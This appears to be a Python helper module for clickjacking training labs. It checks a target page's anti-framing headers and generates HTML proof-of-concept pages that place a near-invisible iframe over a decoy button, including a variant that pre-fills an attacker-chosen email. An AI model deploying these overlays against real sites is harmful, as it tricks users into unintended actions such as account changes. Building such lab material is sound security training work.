"""
utils.py — shared helpers for the Clickjacking module labs.

📝 Note: clickjacking labs are different from every other module here — the
"exploit" is almost always a crafted HTML page (an iframe overlay trick)
hosted on the exploit server and delivered to a victim's browser. There's no
request-forging payload to send; `proxies.py`/requests are only used here to
sanity-check a target's anti-framing defenses before building the PoC.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def check_framing_defenses(session, url):
    """
    Inspect a page's response for the headers/markup that would block framing:
    X-Frame-Options, frame-ancestors in CSP, and a JS frame-buster script.
    Doesn't guarantee a frame-buster won't still fire client-side — just a
    quick first pass before building the PoC.
    """
    r = session.get(url)
    xfo = r.headers.get("X-Frame-Options")
    csp = r.headers.get("Content-Security-Policy", "")
    frame_ancestors = "frame-ancestors" in csp
    has_busting_js = any(s in r.text for s in ("self !== top", "top.location", "top != self"))

    log(f"X-Frame-Options: {xfo or 'not set'}")
    log(f"CSP frame-ancestors present: {frame_ancestors}")
    log(f"Possible JS frame-buster in page: {has_busting_js}")
    return {"xfo": xfo, "frame_ancestors": frame_ancestors, "js_buster": has_busting_js}


def build_basic_overlay_poc(target_url, button_top="60px", button_left="60px"):
    """
    The classic PortSwigger clickjacking PoC: a real iframe of the target
    page, with a decoy button drawn on top at the exact coordinates of the
    real "sensitive" button underneath (e.g. "Delete account", "Grant access").
    Use the lab's "Open in browser" alignment helper to get the offsets right.
    """
    return f"""<style>
  iframe {{
    position: relative;
    width: 700px;
    height: 500px;
    opacity: 0.0001;
    z-index: 2;
  }}
  div {{
    position: absolute;
    top: {button_top};
    left: {button_left};
    z-index: 1;
  }}
</style>
<div>Click me</div>
<iframe src="{target_url}"></iframe>"""


def build_prefilled_overlay_poc(target_url_with_params, button_top="60px", button_left="60px"):
    """
    Same overlay trick, but the iframe src carries query-string parameters
    that pre-fill a form field (e.g. ?email=attacker@evil-user.net) so the
    single disguised click submits attacker-chosen data, not just a generic
    confirm action.
    """
    return build_basic_overlay_poc(target_url_with_params, button_top, button_left)
